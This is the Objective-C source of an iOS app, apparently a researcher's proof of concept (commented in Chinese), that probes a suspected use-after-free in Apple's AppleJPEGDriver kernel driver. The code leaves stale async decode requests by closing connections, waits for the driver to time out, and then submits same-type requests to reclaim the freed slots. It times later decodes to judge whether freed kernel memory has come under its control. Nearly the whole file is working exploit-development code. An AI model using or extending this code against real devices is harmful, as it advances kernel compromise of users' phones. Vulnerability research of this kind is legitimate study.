//
//  jpeg_poc7.m — AppleJPEGDriver UAF 的行为学验证（不依赖 MTE）
//
//  背景（jpegpoc5/6 实测结论）：
//    · decode/async 都已真机跑通
//    · 提交 async 后关连接 → 队列留下「活着但永不完成」的节点
//    · 打开相机 → BWGraph stop 等它们 → 超时 → SIGTRAP 崩溃（两次，栈完全一致）
//    · 但是**没有 kernel panic** —— 因为 A14 没有 MTE，读已释放内存不会 tag fault
//
//  所以不能用「崩不崩」当判据。改用**行为学**：
//
//  核心问题：stale 节点被「同类型 reclaim」占回之后，驱动处理它的行为会不会变？
//
//  三组对照（都不打开相机，安全）：
//    基线  : 干净状态 → 同步 decode（token=0）→ 测耗时 T_base
//    victim: 造 5 个 stale → 等 12s（让驱动超时）→ 同步 decode → 测 T_victim
//    reclaim: 造 5 个 stale → 等 12s → 新连接提交 5 个 async 占回槽位
//             → 同步 decode → 测 T_reclaim
//
//  判读：
//    · T_victim 明显 > T_base          → stale 状态确实影响后续 decode（洞成立）
//    · T_reclaim ≈ T_base（比 victim 快）→ reclaim 成功占回，我们控制了那块内存
//    · T_reclaim 仍 ≈ T_victim         → reclaim 没打中（可能是 type isolation 挡住了）
//
//  另外一个独立信号：每轮之后查驱动健康（全零 0x58 请求应返回 kIOReturnNotOpen 0xe00002cc）
//
//  安全性：全程不打开相机、不 spray 到失控、不主动制造 panic。最坏是驱动卡住，
//        重启即可恢复。
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <unistd.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID  IOSurfaceGetID(IOSurfaceRef buffer);
extern void        *IOSurfaceGetBaseAddress(IOSurfaceRef buffer);
extern size_t       IOSurfaceGetAllocSize(IOSurfaceRef buffer);
extern kern_return_t IOSurfaceLock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef buffer, uint32_t options, uint32_t *seed);

static NSString *const kISWidth = @"IOSurfaceWidth";
static NSString *const kISHeight = @"IOSurfaceHeight";
static NSString *const kISBPE = @"IOSurfaceBytesPerElement";
static NSString *const kISPF = @"IOSurfacePixelFormat";

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 0xe00002bc: return "Error";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "InternalError";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002d5: return "Busy";
        case 0xe00002d6: return "Timeout";
        case 0xe00002d8: return "NotAttached";
        default:         return "?";
    }
}

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"JPEGP7 %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jpegp7.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_async(gQ, ^{
        [gLog appendString:line];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
        });
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:18 weight:UIFontWeightBold];
        }
    });
}

typedef struct __attribute__((packed)) {
    uint32_t sourceID, field_04, destID, field_0C, field_10;
    uint32_t width, height, field_1C;
    uint8_t  flags, pad_21[3];
    uint32_t xOffset, yOffset, subsampling;
    uint64_t asyncToken, asyncToken2, field_40;
    uint32_t codecID, outWidth, outHeight, field_54;
} jpeg_req_t;
_Static_assert(sizeof(jpeg_req_t) == 0x58, "must be 0x58");

static NSData *makeJPEG(uint32_t w, uint32_t h)
{
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

static IOSurfaceRef makeSourceSurface(NSData *jpeg)
{
    size_t allocLen = (jpeg.length + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{ kISWidth: @(allocLen), kISHeight: @1, kISBPE: @1, kISPF: @0x20202020 };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) return NULL;
    IOSurfaceLock(s, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(s);
    if (base) memcpy(base, jpeg.bytes, jpeg.length);
    IOSurfaceUnlock(s, 0, NULL);
    return s;
}

static IOSurfaceRef makeDestSurface(uint32_t w, uint32_t h)
{
    NSDictionary *props = @{ kISWidth: @(w), kISHeight: @(h), kISBPE: @4, kISPF: @0x42475241 };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

// 单次调用，返回 kr；us 非空则写耗时（微秒）
static kern_return_t jpeg_call(io_connect_t conn, uint32_t sel,
                               uint32_t srcID, uint32_t dstID,
                               uint32_t w, uint32_t h,
                               uint64_t token, uint32_t sub, uint64_t *us)
{
    jpeg_req_t in; memset(&in, 0, sizeof(in));
    in.sourceID = srcID; in.field_04 = w*h;
    in.destID = dstID;   in.field_0C = w*h*4;
    in.width = w; in.height = h;
    in.outWidth = w; in.outHeight = h;
    in.subsampling = sub; in.asyncToken = token;

    jpeg_req_t out; memset(&out, 0, sizeof(out));
    size_t os = sizeof(out);

    uint64_t t0 = mach_absolute_time();
    kern_return_t kr = IOConnectCallStructMethod(conn, sel, &in, sizeof(in), &out, &os);
    uint64_t t1 = mach_absolute_time();

    if (us) {
        mach_timebase_info_data_t tb; mach_timebase_info(&tb);
        *us = (t1 - t0) * tb.numer / tb.denom / 1000;
    }
    return kr;
}

// 驱动健康：发一个全零 0x58 请求，正常应返回 NotOpen(0xe00002cc)
static kern_return_t health(io_service_t svc)
{
    io_connect_t c = MACH_PORT_NULL;
    if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) return 0xffffffff;
    jpeg_req_t in; memset(&in, 0, sizeof(in));
    jpeg_req_t out; memset(&out, 0, sizeof(out));
    size_t os = sizeof(out);
    kern_return_t kr = IOConnectCallStructMethod(c, 1, &in, sizeof(in), &out, &os);
    IOServiceClose(c);
    return kr;
}

// 造 N 个 stale：新连接提交 N 个 async 然后立刻关
static int makeStale(io_service_t svc, uint32_t srcID, uint32_t dstID,
                     uint32_t w, uint32_t h, int n)
{
    io_connect_t c = MACH_PORT_NULL;
    if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) return 0;
    int sub = 0;
    for (int j = 0; j < n; j++) {
        kern_return_t kr = jpeg_call(c, 1, srcID, dstID, w, h, 0xA000 + j, 3, NULL);
        if (kr != KERN_SUCCESS) break;
        sub++;
    }
    IOServiceClose(c);
    return sub;
}

// 同类型 reclaim：新连接提交 N 个 async，但**先不关**（占住槽位）
static io_connect_t makeReclaim(io_service_t svc, uint32_t srcID, uint32_t dstID,
                                uint32_t w, uint32_t h, int n)
{
    io_connect_t c = MACH_PORT_NULL;
    if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) return MACH_PORT_NULL;
    int sub = 0;
    for (int j = 0; j < n; j++) {
        kern_return_t kr = jpeg_call(c, 1, srcID, dstID, w, h, 0xB000 + j, 3, NULL);
        if (kr != KERN_SUCCESS) break;
        sub++;
    }
    L(@"    reclaim 提交 %d/%d", sub, n);
    return c;   // 调用者负责关闭
}

static int cmp_u64(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static uint64_t median(uint64_t *arr, int n)
{
    if (n <= 0) return 0;
    qsort(arr, n, sizeof(uint64_t), cmp_u64);
    return arr[n/2];
}

static void run(void)
{
    L(@"===== AppleJPEGDriver UAF behavioral probe (no MTE needed) =====");
    L(@"uid=%d pid=%d", getuid(), getpid());

    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
    L(@"[1] service = 0x%08x", svc);
    if (svc == MACH_PORT_NULL) return;

    // 建 surface
    const uint32_t W = 512, H = 512;
    NSData *jpeg = makeJPEG(W, H);
    IOSurfaceRef src = makeSourceSurface(jpeg);
    IOSurfaceRef dst = makeDestSurface(W, H);
    if (!src || !dst) { L(@"surface 创建失败"); IOObjectRelease(svc); return; }
    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
    L(@"[2] surface: srcID=%u dstID=%u  (%ux%u, jpeg=%lu B)",
      srcID, dstID, W, H, (unsigned long)jpeg.length);

    kern_return_t h0 = health(svc);
    L(@"[3] 初始健康: 0x%08x %s （期望 NotOpen 0xe00002cc）", (uint32_t)h0, kr_name(h0));

    const int ROUNDS = 8;
    uint64_t tBase[32], tVictim[32], tReclaim[32];
    int nB = 0, nV = 0, nR = 0;

    // ---------- 基线：干净状态下的 sync decode ----------
    L(@"");
    L(@"=== 基线：干净状态 sync decode × %d ===", ROUNDS);
    SetStatus(@"基线测量...");
    for (int i = 0; i < ROUNDS; i++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        uint64_t us = 0;
        kern_return_t kr = jpeg_call(c, 1, srcID, dstID, W, H, 0, 3, &us);
        IOServiceClose(c);
        if (kr == KERN_SUCCESS) { tBase[nB++] = us; }
    }
    L(@"  完成 %d 次，中位数 %llu us", nB, (unsigned long long)median(tBase, nB));

    // ---------- victim：造 stale → 等 12s → sync decode ----------
    L(@"");
    L(@"=== victim：造 5 个 stale → 等 12s → sync decode × %d ===", ROUNDS);
    SetStatus(@"造 stale 状态...");
    int stale1 = makeStale(svc, srcID, dstID, W, H, 5);
    L(@"  已造 %d 个 stale，等待 12 秒（让驱动超时）...", stale1);
    for (int s = 12; s > 0; s--) { SetStatus([NSString stringWithFormat:@"victim 等待 %d s", s]); sleep(1); }

    SetStatus(@"victim 测量...");
    for (int i = 0; i < ROUNDS; i++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        uint64_t us = 0;
        kern_return_t kr = jpeg_call(c, 1, srcID, dstID, W, H, 0, 3, &us);
        IOServiceClose(c);
        if (kr == KERN_SUCCESS) { tVictim[nV++] = us; }
        else L(@"    victim 第 %d 次 kr=0x%08x %s", i, (uint32_t)kr, kr_name(kr));
    }
    L(@"  完成 %d 次，中位数 %llu us", nV, (unsigned long long)median(tVictim, nV));
    L(@"  健康: 0x%08x %s", (uint32_t)health(svc), kr_name(health(svc)));

    // ---------- reclaim：造 stale → 等 12s → 同类型占回 → sync decode ----------
    L(@"");
    L(@"=== reclaim：造 5 个 stale → 等 12s → 5 个新 async 占回 → sync decode × %d ===", ROUNDS);
    SetStatus(@"造第二轮 stale...");
    int stale2 = makeStale(svc, srcID, dstID, W, H, 5);
    L(@"  已造 %d 个 stale，等待 12 秒...", stale2);
    for (int s = 12; s > 0; s--) { SetStatus([NSString stringWithFormat:@"reclaim 等待 %d s", s]); sleep(1); }

    SetStatus(@"reclaim 占回...");
    io_connect_t rc = makeReclaim(svc, srcID, dstID, W, H, 5);
    L(@"  reclaim 连接已建立: 0x%08x（保持不关，占住槽位）", rc);
    usleep(300 * 1000);

    SetStatus(@"reclaim 测量...");
    for (int i = 0; i < ROUNDS; i++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
        uint64_t us = 0;
        kern_return_t kr = jpeg_call(c, 1, srcID, dstID, W, H, 0, 3, &us);
        IOServiceClose(c);
        if (kr == KERN_SUCCESS) { tReclaim[nR++] = us; }
        else L(@"    reclaim 第 %d 次 kr=0x%08x %s", i, (uint32_t)kr, kr_name(kr));
    }
    L(@"  完成 %d 次，中位数 %llu us", nR, (unsigned long long)median(tReclaim, nR));

    if (rc) { IOServiceClose(rc); L(@"  reclaim 连接已关闭"); }
    L(@"  健康: 0x%08x %s", (uint32_t)health(svc), kr_name(health(svc)));

    // ---------- 汇总 ----------
    uint64_t mB = median(tBase, nB), mV = median(tVictim, nV), mR = median(tReclaim, nR);
    L(@"");
    L(@"===== 汇总 =====");
    L(@"  基线   : n=%d  中位 %llu us", nB, (unsigned long long)mB);
    L(@"  victim : n=%d  中位 %llu us   (%+lld us vs 基线)", nV, (unsigned long long)mV, (long long)(mV - mB));
    L(@"  reclaim: n=%d  中位 %llu us   (%+lld us vs 基线)", nR, (unsigned long long)mR, (long long)(mR - mB));
    L(@"");
    if (nB == 0 || nV == 0) {
        L(@"  数据不足，无法判定");
    } else if (mV > mB * 13 / 10) {   // victim 比基线慢 30% 以上
        L(@"  ★ victim 明显慢于基线 ⇒ stale 状态确实影响了后续 decode（洞成立）");
        if (nR > 0 && mR < mV * 9 / 10) {
            L(@"  ★★ reclaim 明显快于 victim ⇒ 同类型占回成功，我们控制了那块内存 = UAF 可控实证");
        } else if (nR > 0) {
            L(@"  reclaim 与 victim 接近 ⇒ 占回未命中（type isolation 或时序问题）");
        }
    } else {
        L(@"  victim 与基线接近 ⇒ stale 状态未影响 decode 路径，需要换触发条件");
    }
    L(@"");
    L(@"  注意：本实验全程未打开相机，不会 panic。");
    L(@"  若相机此前被卡死，重启设备即可恢复。");

    CFRelease(src); CFRelease(dst);
    IOObjectRelease(svc);
    SetStatus(@"完成，看下方日志");
    L(@"===== done =====");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("jpegp7.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 55, self.window.bounds.size.width - 16, 44)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"starting...";
    gStatus.textColor = [UIColor colorWithRed:0.4 green:1 blue:0.4 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:18 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 105, self.window.bounds.size.width, h - 105)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:8] ?: [UIFont systemFontOfSize:8];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
